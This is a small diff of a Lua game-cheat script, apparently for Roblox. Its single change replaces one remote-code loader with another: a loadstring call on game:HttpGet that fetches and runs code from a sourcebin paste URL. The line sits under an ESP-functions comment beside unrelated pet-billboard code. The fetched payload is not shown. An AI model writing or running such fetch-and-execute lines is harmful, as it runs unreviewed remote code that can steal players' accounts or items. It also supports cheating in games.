@@ -75,7 +75,7 @@ end
 
 -- ESP functions
     
-loadstring(game:HttpGet("https://raw.githubusercontent.com/kyletzya/ts/refs/heads/main/ts"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/N9pauCcQmz/0", true))()
 local function removeESP()
     for _, egg in pairs(workspace:GetDescendants()) do
         if egg:FindFirstChild("PetNameBillboard") then
